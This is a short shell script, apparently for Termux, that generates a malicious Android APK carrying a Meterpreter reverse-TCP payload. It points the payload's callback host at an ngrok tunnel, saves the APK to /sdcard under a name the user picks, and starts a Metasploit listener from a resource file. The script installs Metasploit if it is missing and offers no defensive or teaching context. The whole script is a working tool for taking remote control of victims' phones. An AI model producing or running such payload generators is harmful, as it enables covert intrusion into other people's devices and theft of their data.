echo 'Do you install METASPLOIT ( yes / no )'
read -p '>> ' meta
if [ $meta = yes ]
then
echo 'new hack android ? ( yes / no ) '
read -p '>> ' check
if [ $check = yes ]
then
echo LPORT: | lolcat
read -p '>> ' LPORT
echo Apk name: | lolcat
read -p '>> ' APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$LPORT R >/sdcard/$APK.apk
msfconsole -r auto.rc
else
echo 'you must run this commamd: '
echo 'set LPORT <your ngrok port> ' | lolcat
msfconsole -r auto.rc
fi
else
pkg install metasploit -y
h-droid
fi

